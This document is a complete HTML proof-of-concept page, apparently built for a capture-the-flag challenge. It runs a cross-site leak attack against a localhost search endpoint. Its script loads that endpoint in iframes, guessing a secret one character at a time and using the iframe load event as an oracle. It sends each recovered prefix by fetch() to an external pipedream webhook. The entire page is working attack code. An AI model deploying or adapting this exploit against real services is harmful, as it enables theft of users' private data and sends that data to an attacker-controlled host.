<html>
    <head>
        <title>POC</title>
    </head>
    <body>
        <div id="attack"></div>
        <script>

            function sleep(ms) {
                return new Promise(resolve => setTimeout(resolve, ms));
            }

            function send(append,s) {
                var webhook="https://enk4ddo29rqi.x.pipedream.net/?data=";
                fetch(webhook+append+s);
                //create_payload(append+s);
                
            }
            
            async function create_payload(append) {
                var src_1=""
                var s=''
                var flag=0;
                var printable="qwebrtyuiopsdfgbhjklxcvnmQWERTYUIOPASDFGHJKLZXCVBNM123456678990!@#$(){}"
                var frame = document.createElement("iframe");
                var test
                const list = document.getElementById("attack");
                while (list.hasChildNodes()) {
                    list.removeChild(list.firstChild);
                }
                for (let i = 0; i < printable.length; i++) {
                    src_1="http://localhost:2222/search?query="+append+printable[i]+"&hint=lengthasdä¸–"
                    frame.id="exp"+printable[i]
                    frame.width = "300";
                    frame.height = "100";
                    frame.src=src_1
                    await sleep(2.5 * 1000);
                    document.getElementById("attack").appendChild(frame)
                    document.getElementById("exp"+printable[i]).onload = function() {
                        console.log("iframe content loaded");
                        send(append,printable[i+1])
                        flag=1
                        s=printable[i+1]
                    };
                    if(flag){
                        break;
                    }
                }
            return create_payload(append+s)
            }
            create_payload("");
        </script>
    </body>
</html>